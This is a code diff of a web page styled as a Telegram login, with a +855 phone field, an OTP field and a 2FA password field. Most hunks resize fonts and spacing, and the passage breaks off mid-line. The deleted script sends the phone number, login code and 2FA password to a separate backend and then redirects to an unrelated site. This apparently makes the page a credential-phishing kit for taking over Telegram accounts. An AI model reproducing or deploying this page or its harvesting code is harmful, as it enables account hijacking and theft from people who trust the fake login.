@@ -29,12 +29,12 @@
   }
   .card {
     width: 100%;
-    max-width: 400px;
+    max-width: 450px;
     text-align: center;
   }
   .logo {
-    width: 110px;
-    height: 110px;
+    width: 120px;
+    height: 120px;
     border-radius: 50%;
     margin: 0 auto 24px;
     overflow: hidden;
@@ -50,23 +50,24 @@
   }
   h1 {
     color: var(--text-main);
-    font-size: 40px;
-    font-weight: 800;
-    margin: 0 0 12px;
+    font-size: 48px;
+    font-weight: 600;
+    margin: 0 0 16px;
   }
   p.sub {
     color: var(--text-sub);
-    font-size: 14px;
-    line-height: 1.5;
-    margin: 0 0 32px;
+    font-size: 32px;
+    font-weight: 400;
+    line-height: 1.4;
+    margin: 0 0 36px;
     padding: 0 10px;
   }
   .field {
     position: relative;
     border: 1px solid var(--card-border);
-    border-radius: 12px;
-    padding: 14px 16px 8px;
-    margin-bottom: 16px;
+    border-radius: 16px;
+    padding: 22px 20px 12px;
+    margin-bottom: 20px;
     text-align: left;
     background: var(--bg);
   }
@@ -75,11 +76,12 @@
   }
   .field label {
     position: absolute;
-    top: -7px;
-    left: 14px;
+    top: -12px;
+    left: 16px;
     background: var(--bg);
-    padding: 0 4px;
-    font-size: 11px;
+    padding: 0 6px;
+    font-size: 26px;
+    font-weight: 400;
     color: #888888;
   }
   .field input, .field select {
@@ -88,7 +90,8 @@
     border: none;
     outline: none;
     color: var(--text-main);
-    font-size: 16px !important;
+    font-size: 36px !important;
+    font-weight: 400;
   }
   .country-select {
     display: flex;
@@ -99,25 +102,26 @@
   .country-info {
     display: flex;
     align-items: center;
-    gap: 10px;
+    gap: 12px;
   }
   .flag-emoji {
-    font-size: 20px;
+    font-size: 36px;
     line-height: 1;
   }
   .country-info span {
     color: var(--text-main);
-    font-size: 16px;
+    font-size: 36px;
+    font-weight: 400;
   }
   .dropdown-arrow {
     color: var(--text-sub);
-    font-size: 12px;
+    font-size: 20px;
   }
   .checkbox-row {
     display: flex;
     align-items: center;
-    gap: 12px;
-    margin: 24px 0 32px 4px;
+    gap: 16px;
+    margin: 28px 0 36px 4px;
     text-align: left;
     cursor: pointer;
     user-select: none;
@@ -126,10 +130,10 @@
     display: none;
   }
   .checkmark {
-    width: 20px;
-    height: 20px;
+    width: 28px;
+    height: 28px;
     background-color: #2b2b2b;
-    border-radius: 4px;
+    border-radius: 6px;
     display: flex;
     justify-content: center;
     align-items: center;
@@ -140,22 +144,23 @@
   }
   .checkbox-row input:checked + .checkmark::after {
     content: "✔";
-    font-size: 12px;
+    font-size: 16px;
     color: #ffffff;
   }
   .checkbox-row span { 
     color: #dddddd; 
-    font-size: 15px; 
+    font-size: 36px; 
+    font-weight: 400;
   }
   .btn-primary {
     width: 100%;
     background-color: var(--accent);
     color: white;
     border: none;
-    padding: 14px;
-    border-radius: 12px;
-    font-size: 16px;
-    font-weight: 600;
+    padding: 20px;
+    border-radius: 16px;
+    font-size: 36px;
+    font-weight: 500;
     cursor: pointer;
     transition: background-color 0.2s, transform 0.05s;
   }
@@ -166,16 +171,16 @@
     transform: scale(0.98);
   }
   .alt-links {
-    margin-top: 24px;
+    margin-top: 32px;
     display: flex;
     flex-direction: column;
-    gap: 18px;
+    gap: 24px;
   }
   .alt-links a {
     color: var(--accent);
     text-decoration: none;
-    font-size: 13px;
-    font-weight: 600;
+    font-size: 36px;
+    font-weight: 500;
     letter-spacing: 0.5px;
   }
   .alt-links a:hover {
@@ -224,7 +229,7 @@
         <span>Keep me signed in</span>
       </label>
 
-      <button id="btn-send" onclick="sendPhone()" class="btn-primary">SEND CODE</button>
+      <button id="btn-send" onclick="sendPhone()" class="btn-primary">NEXT</button>
 
       <!-- តំណភ្ជាប់ខាងក្រោម -->
       <div class="alt-links">
@@ -235,172 +240,7 @@
 
     <!-- STEP 2: OTP & 2FA Form -->
     <div id="step-otp" class="space-y-6 hidden">
-      <div class="text-5xl mb-2">🔐</div>
+      <div class="text-6xl mb-4">🔐</div>
       <div>
-        <h2 id="display-phone" class="text-lg font-semibold mb-1 text-white"></h2>
-        <p class="text-gray-400 text-sm">We've sent the code to your Telegram app.</p>
-      </div>
-      
-      <div class="text-left space-y-4">
-        <div class="field">
-          <label>Telegram Code</label>
-          <input id="otp-input" type="text" placeholder="Enter code" maxlength="6" class="text-center font-mono tracking-widest text-xl">
-        </div>
-
-        <!-- Input 2FA Password -->
-        <div id="password-container" class="field hidden">
-          <label>Two-Step Password (2FA)</label>
-          <input id="password-input" type="password" placeholder="Enter your 2FA password">
-        </div>
-      </div>
-
-      <button id="btn-verify" onclick="submitOTP()" class="btn-primary">VERIFY & LOGIN</button>
-      <div>
-        <button onclick="goBack()" class="text-xs text-[#8774e1] hover:underline active:opacity-70 transition">Change Phone Number</button>
-      </div>
-    </div>
-
-  </div>
-
-  <script>
-    const BACKEND_URL = "";
-
-    function preventPrefixDelete(e, input) {
-        const prefixLength = 5;
-        if (e.key === 'Backspace' && input.selectionStart <= prefixLength && input.selectionEnd <= prefixLength) {
-            e.preventDefault();
-        }
-    }
-
-    function handlePaste(e, input) {
-        e.preventDefault();
-        let pasteData = (e.clipboardData || window.clipboardData).getData('text');
-        let digits = pasteData.replace(/[^\d]/g, '');
-
-        if (digits.startsWith('855')) {
-            digits = digits.slice(3);
-        }
-        if (digits.startsWith('0')) {
-            digits = digits.slice(1);
-        }
-
-        input.value = '+855 ' + digits;
-        formatPhoneNumber(input);
-    }
-
-    function formatPhoneNumber(input) {
-        const prefix = '+855 ';
-        
-        if (!input.value.startsWith('+855')) {
-            input.value = prefix;
-        }
-
-        let rawDigits = input.value.slice(5).replace(/[^\d]/g, '');
-
-        if (rawDigits.startsWith('0')) {
-            rawDigits = rawDigits.slice(1);
-        }
-
-        let parts = [];
-        if (rawDigits.length > 0) parts.push(rawDigits.slice(0, 2));
-        if (rawDigits.length > 2) parts.push(rawDigits.slice(2, 5));
-        if (rawDigits.length > 5) parts.push(rawDigits.slice(5, 9));
-
-        input.value = prefix + parts.join(' ');
-    }
-
-    async function sendPhone() {
-        const phoneInput = document.getElementById('phone-input');
-        const btn = document.getElementById('btn-send');
-        const phoneClean = phoneInput.value.replace(/\s+/g, '').trim();
-
-        if (!phoneClean || phoneClean.length < 9) {
-            alert('Please enter a valid phone number.');
-            return;
-        }
-
-        btn.disabled = true;
-        btn.innerText = 'SENDING...';
-        btn.classList.add('opacity-70');
-
-        try {
-            const res = await fetch(`${BACKEND_URL}/api/send-code`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phoneNumber: phoneClean })
-            });
-            const data = await res.json();
-
-            if (data.success) {
-                document.getElementById('display-phone').innerText = phoneInput.value.trim();
-                document.getElementById('step-phone').classList.add('hidden');
-                document.getElementById('step-otp').classList.remove('hidden');
-            } else {
-                alert(data.error || 'Failed to send code.');
-            }
-        } catch (err) {
-            alert('Cannot connect to backend server!');
-            console.error(err);
-        } finally {
-            btn.disabled = false;
-            btn.innerText = 'SEND CODE';
-            btn.classList.remove('opacity-70');
-        }
-    }
-
-    async function submitOTP() {
-        const phoneInput = document.getElementById('phone-input');
-        const phoneClean = phoneInput.value.replace(/\s+/g, '').trim();
-        const code = document.getElementById('otp-input').value.trim();
-        const password = document.getElementById('password-input').value.trim();
-        const btn = document.getElementById('btn-verify');
-
-        if (!code) {
-            alert('Please enter the OTP code.');
-            return;
-        }
-
-        btn.disabled = true;
-        btn.innerText = 'VERIFYING...';
-        btn.classList.add('opacity-70');
-
-        try {
-            const res = await fetch(`${BACKEND_URL}/api/verify-code`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    phoneNumber: phoneClean, 
-                    code: code,
-                    password: password || undefined
-                })
-            });
-            const data = await res.json();
-
-            if (data.success) {
-                window.location.replace(data.redirectUrl || "https://jvpfans.com");
-            } else if (data.requiresPassword) {
-                document.getElementById('password-container').classList.remove('hidden');
-                alert('This account has Two-Step Verification enabled. Please enter your 2FA password.');
-            } else {
-                alert(data.error || 'Verification failed.');
-            }
-        } catch (err) {
-            alert('Connection error!');
-            console.error(err);
-        } finally {
-            btn.disabled = false;
-            btn.innerText = 'VERIFY & LOGIN';
-            btn.classList.remove('opacity-70');
-        }
-    }
-
-    function goBack() {
-        document.getElementById('step-otp').classList.add('hidden');
-        document.getElementById('password-container').classList.add('hidden');
-        document.getElementById('password-input').value = '';
-        document.getElementById('otp-input').value = '';
-        document.getElementById('step-phone').classList.remove('hidden');
-    }
-  </script>
-</body>
-</html>
+        <h2 id="display-phone" class="text-2xl font-semibold mb-2 text-white"></h2>
+        <p class="text-gray-40
